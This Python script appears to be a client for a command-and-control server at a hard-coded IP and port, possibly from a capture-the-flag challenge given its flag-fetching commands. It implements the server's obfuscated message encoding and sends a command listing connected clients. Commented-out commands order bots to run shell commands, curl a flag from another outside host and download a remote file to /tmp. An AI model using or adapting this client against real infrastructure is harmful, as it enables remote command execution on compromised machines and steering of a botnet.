#! /usr/bin/python

import binascii
import base64
import struct
import socket
import hashlib
from time import sleep

def encode(prefix, msg):
    out = prefix + msg
    h = hashlib.sha384(out.encode('ascii')).hexdigest()
    out = out + ';;' + h
    print(out)
    rev = prefix + binascii.hexlify(bytes(out, 'ascii')).decode('ascii')
    b64 = base64.b64encode(bytes(rev[::-1], 'ascii'))
    return struct.pack('>Q', len(b64)) + b64

def decode(msg):
    l = struct.unpack('>Q', msg[:8])[0]
    rev = base64.b64decode(msg[8:8 + l])[::-1]
    prefix, out = rev[:16].decode('ascii'), rev[16:]
    out = binascii.unhexlify(out).decode('ascii')
    return (prefix, out)

TCP_IP = '78.128.216.92'
TCP_PORT = 20220
BUFFER_SIZE = 1024 * 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

cmds = [
#    ('kl5puyj43brf7iso', ';;execute;;*;;ls /etc;;b8d4cd29e64dbf3cec215e6444ef8d5eff5df0f75389fb564ecb13008a6738a681a1f3cfe1ef3699cd9a5809eb7fa9f6'),
#    ('kl5puyj43brf7iso', ';;wait;;*;;5' ), #944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb'),
#    ('kl5puyj43brf7iso', ';;execute;;*;;ls'),
#    ('kl5puyj43brf7iso', ';;execute;;0000000000000000;;curl http://212.224.105.50:1234/flag'),
    ('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;clients'),
#    ('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;active'),
#    ('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;active'),
#    ('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;active'),
#    ('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;active'),
#    ('kl5puyj43brf7iso', ';;execute;;0000000000000000;;ls -lha /etc'),
#    ('kl5puyj43brf7iso', ';;download;;0hpxc5sdo9kgne64;;/tmp/flag;;http://212.224.105.50:1234/flag')
]

#print('944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb')
#print(hashlib.sha384('kl5puyj43brf7iso;;wait;;*;;5'.encode('ascii')).hexdigest())
#print('---')
#encode(cmds[1][0], cmds[1][1])

for cmd in cmds:
    print(cmd)
    s.send(encode(cmd[0], cmd[1]))
    data = s.recv(BUFFER_SIZE)
    data += s.recv(BUFFER_SIZE)
    print(decode(data))

s.close()

